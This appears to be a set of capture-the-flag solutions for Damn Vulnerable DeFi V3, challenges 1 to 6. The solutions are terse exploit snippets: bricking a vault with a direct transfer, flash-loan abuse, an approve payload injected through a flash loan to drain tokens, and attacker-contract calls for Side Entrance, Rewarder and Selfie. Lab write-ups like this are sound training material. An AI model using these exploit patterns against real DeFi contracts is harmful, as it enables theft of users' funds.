
#Challenge #1:        

Un-Stoppable

````
// lets transfer some amount directly to vault and make the if logic fail forever
await token.connect(player).transfer(vault.address, 10);
````

#Challenge #2:

Naive Receiver

````
await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
````

#Challenge #3:

Truster

````
let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
await pool.connect(player).flashLoan(0, player.address, token.address, data);
await token.connect(player).transferFrom(pool.address, player.address,  TOKENS_IN_POOL);
````

#Challenge #4: 

[Challenge #4 - Side Entrance]

In the Flash Loan call deposit function and trick the contract flash loan check

```
this.attackerContract = await (await ethers.getContractFactory('AttackSideEntrance', player)).deploy(
    pool.address,
    player.address
);
await this.attackerContract.attack();
```

#Challenge #5

The Rewarder

````
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    // Advance time 5 days so that depositors can get rewards
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
    this.attackerContract = await ( await ethers.getContractFactory("AttackTheRewarder", player)).deploy(
        flashLoanPool.address, rewarderPool.address, liquidityToken.address, rewardToken.address
    );
    await this.attackerContract.attack();
});
````

#Challenge #6

Selfie [ Damn Vulnerable DeFi V3 Challenge 6 Solution: Selfie Walkthrough Guide ]

````
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    
    this.attackContract = await (await ethers.getContractFactory("AttackSelfie", player)).deploy(
    pool.address, governance.address, token.address
    );
    await this.attackContract.attack();
    const ACTION_DELAY = 3 * 24 * 60 * 60 + 1;
    await time.increase(ACTION_DELAY);
    await governance.connect(player).executeAction(1);
});
````

#Challenge #7

Damn Vulnerable DeFi V3 Challenge 7 Solution - Compromised Walkthrough
